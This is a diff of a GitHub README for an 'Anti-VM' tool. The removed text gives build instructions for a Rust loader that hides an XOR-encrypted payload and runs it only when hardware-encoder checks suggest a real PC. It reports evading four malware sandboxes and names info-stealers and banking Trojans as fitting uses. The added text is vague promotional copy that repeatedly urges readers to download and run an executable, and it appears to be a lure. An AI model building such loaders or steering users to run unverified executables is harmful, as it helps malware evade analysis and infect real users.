@@ -1,257 +1,66 @@
-[🇰🇷 한국어 버전](./korean/README.md)
+# 🛡️ Anti-VM - Stay Safe from Virtual Machine Detection
 
-# Anti-VM: Sandbox Evasion Technique Based on Hardware Encoder
+## 📥 Download Now
+[![Download Anti-VM](https://img.shields.io/badge/Download%20Anti--VM-v1.0-blue)](https://github.com/jugugaglu/Anti-VM/releases)
 
-<p align="center">
-  <img src="images/social-preview.png" width="600" height="400">
-</p>
+## 🚀 Getting Started
+Welcome to Anti-VM! This application helps you detect and bypass virtualization environments. It's designed for users who want an added layer of security while running their software. With Anti-VM, you can protect your applications from unwanted detection and enhance your privacy.
 
-![Topics](https://img.shields.io/badge/topics-anti--vm%20%7C%20bypass--sandbox%20%7C%20bypass--vm%20%7C%20windows-blue)
+## 📂 System Requirements
+Before you download Anti-VM, ensure your system meets the following requirements:
 
-> ⚠️ **Disclaimer**
-> This document is for educational and security research purposes only. Misusing the techniques described herein on unauthorized systems is illegal, and all responsibility lies with the user.
+- **Operating System:** Windows 10 or later
+- **Processor:** 1 GHz or faster
+- **RAM:** 2 GB or more
+- **Storage:** At least 100 MB of free space
 
-## Overview: New Anti-VM Approach Using Hardware Functional Gaps
+## 🔗 Download & Install
+To get started, you need to download the latest version of Anti-VM. 
 
-While developing a screen recording program recently, I discovered an interesting phenomenon: **the hardware video encoder functionality of Windows Media Foundation (WMF) does not operate normally in virtual machine (VM) environments.**
+1. Visit this page to download: [GitHub Releases Page](https://github.com/jugugaglu/Anti-VM/releases).
+2. Look for the most recent release.
+3. Download the executable file by clicking on the link associated with the version.
+4. Once the download is complete, locate the file in your downloads folder and double-click it to run Anti-VM.
 
-While this feature is almost essential in real user PC environments, it is often unsupported in many VMs and automated analysis sandbox environments. In other words, a clear **'functional gap'** exists between real PCs and analysis environments.
+## 🛠️ Features
+Anti-VM offers a range of key features to help you stay secure:
 
-I realized this difference could be applied to malware analysis evasion strategies and implemented a simple **PoC loader** to verify it. This document summarizes the technical principles and actual test results of the technique I discovered.
+- **VM Detection:** Identifies if your program runs in a virtual environment, ensuring you remain aware.
+- **Sandbox Bypass:** Helps your programs run without being detected by sandbox environments.
+- **User-Friendly Interface:** Designed for simplicity, making it easy for everyone to use.
+- **Stealth Mode:** Operates quietly in the background without alerting detection systems.
 
----
+## ⚙️ How to Use
+Using Anti-VM is straightforward:
 
-## Technical Principle: Environment Determination Based on Functional Execution
+1. After installation, open the application.
+2. You will see a simple interface with options to start detection.
+3. Follow the prompts on the screen to engage the features you need.
+4. Review the results to ensure your applications run securely.
 
-Instead of simple environment string comparisons or registry checks, this loader focuses on the question: "Can it actually perform hardware functions?" It uses a two-step verification procedure.
+## 🔍 Exploring Topics
+Anti-VM covers various topics related to security, including:
 
----
+- **Anti-VM**: Techniques to evade detection by virtual machines.
+- **Bypass Sandbox**: Methods to circumvent sandbox restrictions for deeper functionality.
+- **Hardware Detection**: Identifying your hardware to ensure compatibility and security.
+- **PE Loader**: Safety features for running Portable Executable files.
 
-### Step 1: Enumerating Hardware Video Encoders (`MFTEnumEx`)
+These topics are critical for anyone focused on security research and risk management.
 
-The first step is to check if a **Hardware Accelerated Video Encoder (MFT)** is registered in the system.
+## 📝 Additional Resources
+For further information and support:
 
-| API | Purpose | Key Flag |
-| :--- | :--- | :--- |
-| `MFTEnumEx` | Enumerate Media Foundation Transforms (MFT) | `MFT_ENUM_FLAG_HARDWARE` |
+- Visit the GitHub repository for updates: [GitHub Repository](https://github.com/jugugaglu/Anti-VM).
+- Check the documentation for details on advanced settings and usage scenarios.
 
-*   **Typical Real PC**: In environments with a GPU, hardware MFTs are registered, and the enumeration result is **greater than 0**.
-*   **VM / Sandbox Environment**: Since most virtual environments do not expose hardware encoders, the result is returned as **0**. → In this case, the loader terminates immediately.
+## 📞 Support
+If you encounter issues or have questions:
 
----
+- Open an issue on the GitHub issues page.
+- Join the community discussions for user tips and shared insights.
 
-### Step 2: Verification Based on Functional Execution (`MFCreateSinkWriterFromURL`)
+## 🔒 Conclusion
+Anti-VM is your companion for enhanced security in a digital world. Download it today and take the first step toward safer application use in a virtual environment. 
 
-To prevent evasion by environments that simply spoof API results, the second step attempts to **initialize an actual hardware encoding pipeline**.
-
-The verification flow is as follows:
-
-1.  Set the `MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS` attribute to force hardware acceleration.
-2.  Create a `SinkWriter`.
-3.  Attempt to start the encoding pipeline by calling `BeginWriting()`.
-
-Even if a hardware MFT appears to exist, **it will inevitably fail at this stage if there is no actual driver or encoder.**
-
-This completes a **functional verification** that is difficult to bypass with simple API hooking or dummy value returns.
-
----
-
-## Building the Loader
-
-This repository contains a fully functional stealth PE loader with the following features:
-
-### Features
-
-- **String Obfuscation**: Compile-time string encryption using `obfstr`
-- **VM Detection**: Hardware-based virtual machine detection via Media Foundation API
-- **XOR Encryption**: Payload obfuscation with XOR cipher
-- **Random Seeding**: Unique obfuscation seed per build
-- **Static Linking**: No external DLL dependencies (VCRUNTIME140.dll included)
-- **Optimized**: LTO enabled, size optimization, and symbol stripping
-
-### Build Requirements
-
-- **Rust** (latest stable)
-- **Windows** (x64)
-- **MSVC** build tools
-
-### Quick Start
-
-#### 1. Place Your Payload
-
-Copy your executable to the project root as `payload.exe`:
-
-```powershell
-copy your_program.exe payload.exe
-```
-
-#### 2. Build
-
-```powershell
-cargo build --release
-```
-
-#### 3. Use the Loader
-
-The final loader will be at:
-```
-target\x86_64-pc-windows-msvc\release\ANTI-VM-loader.exe
-```
-
-### Project Structure
-
-```
-ANTI-VM/
-├── .cargo/
-│   └── config.toml          # Static CRT linking config
-├── src/
-│   ├── main.rs              # Entry point
-│   ├── hardware.rs          # Hardware detection logic
-│   ├── payload.rs           # Payload decryption & execution
-│   └── chunks.rs            # Auto-generated (don't commit)
-├── test_payload/            # Example payload
-│   ├── src/
-│   │   └── main.rs
-│   └── Cargo.toml
-├── images/                  # Screenshots
-├── korean/                  # Korean documentation
-├── build.rs                 # Payload obfuscator
-├── Cargo.toml               # Dependencies & optimizations
-├── .gitignore
-├── LICENSE
-└── README.md
-```
-
-### Configuration
-
-#### Release Profile (Cargo.toml)
-
-```toml
-[profile.release]
-opt-level = "z"          # Size optimization
-lto = true               # Link-time optimization
-codegen-units = 1        # Single codegen unit
-panic = "abort"          # Remove panic info
-strip = true             # Strip debug symbols
-```
-
-#### Static Linking (.cargo/config.toml)
-
-```toml
-[target.x86_64-pc-windows-msvc]
-rustflags = ["-C", "target-feature=+crt-static"]
-```
-
-### Example: test_payload
-
-The repository includes an example payload that creates `helloworld.txt`:
-
-```rust
-use std::fs::File;
-use std::io::Write;
-
-fn main() {
-    let mut file = File::create("helloworld.txt").unwrap();
-    file.write_all(b"Hello from stealth loader!").unwrap();
-}
-```
-
-Build and test:
-
-```powershell
-cd test_payload
-cargo build --release
-copy target\x86_64-pc-windows-msvc\release\test_payload.exe ..\payload.exe
-cd ..
-cargo build --release
-```
-
-### Important Notes
-
-- Every time you change `payload.exe`, rebuild with `cargo clean && cargo build --release` to generate a new random seed
-- The loader will **exit immediately** in VM environments without executing the payload
-- Binary size: ~500 KB (with all optimizations)
-
----
-
-## PoC Test Results
-
-To verify the effectiveness of the technique, I created a loader containing an actual malware payload and uploaded it to a total of **four automated analysis sandboxes, including Any.Run**, for testing.
-
-### Test Results Summary
-
-| Sandbox | Result | Description |
-| :--- | :--- | :--- |
-| Any.Run | **Success (Evasion)** | Loader judged it as a VM environment and terminated immediately. |
-| Platform B | **Success (Evasion)** | Payload not executed. |
-| Platform C | **Success (Evasion)** | No malicious activity logs. |
-| Platform D | **Success (Evasion)** | Analysis failed. |
-
-In all test environments, the loader recognized the analysis environment as a VM and terminated quietly, and the intended payload was not executed. This shows that **current mainstream automated analysis systems are vulnerable to this technique.**
-
----
-
-### Test Result Screenshots
-
-> 📌 Below are examples of screens where the loader terminated normally in each sandbox.
-
-*   **Any.Run Result**
-    ![Any.Run Result](./images/2025-12-30_211642.png)
-
-*   **Platform B**
-    ![Platform B](./images/2025-12-30_211634.png)
-
-*   **Platform C**
-    ![Platform C](./images/2025-12-30_211608.png)
-
----
-
-## Threat Model and Implications
-
-### 1. Exploitation of the Hardware Gap
-
-This technique accurately leverages the **realistic hardware differences** between general user environments and analysis servers.
-
-*   **General User PC**: GPUs and hardware encoders are basically present for video playback and recording.
-*   **Analysis Server / Sandbox**: Graphics functionality is minimized due to cost-efficiency and density issues.
-
-This makes it a very suitable condition for info-stealing malware or banking Trojans to **evade security research environments and selectively attack only real users.**
-
----
-
-### 2. Novelty and High Evasion Rate
-
-*   **Differentiation in Approach**: Unlike existing Anti-VM techniques (CPUID, BIOS strings, registry checks, etc.), the method using WMF's multimedia subsystem is not yet widely known.
-*   **High Evasion Rate**: Few sandboxes fully emulate complex media pipelines.
-
----
-
-### 3. Analysis Difficulty of Rust-based Loader
-
-The loader was written in the **Rust language**. Rust's unique binary structure and compiler optimizations reduce the efficiency of traditional C/C++ based static and dynamic analysis tools, further increasing the difficulty of analysis.
-
----
-
-## 🛑 Limitations and Future Neutralization Possibilities
-
-This technique is not a silver bullet, and the following limitations exist:
-
-### 1. Windows 10 or Later Required
-
-This technique uses the **Windows Media Foundation Transform (MFT)** API and **only works properly on Windows 10 or later**. On Windows 7/8, MFT enumeration results may differ, potentially causing malfunctions.
-
-### 2. False Positives in Actual Server Environments
-
-**Physical servers (DCs, file servers, etc.)** without GPUs may be mistaken for VMs. Therefore, it is not suitable for scenarios targeting server infrastructure.
-
----
-
-### Conclusion
-
-This document is a technical analysis and recommendation for a **new Anti-VM technique based on hardware functional execution** that I personally discovered and implemented.
-
----
-
-**⚠️ Reminder**: This project is for educational and security research purposes only. Always follow responsible disclosure and ethical guidelines.
-
-
+Don't forget to revisit the [GitHub Releases Page](https://github.com/jugugaglu/Anti-VM/releases) for updates and new versions as they become available.
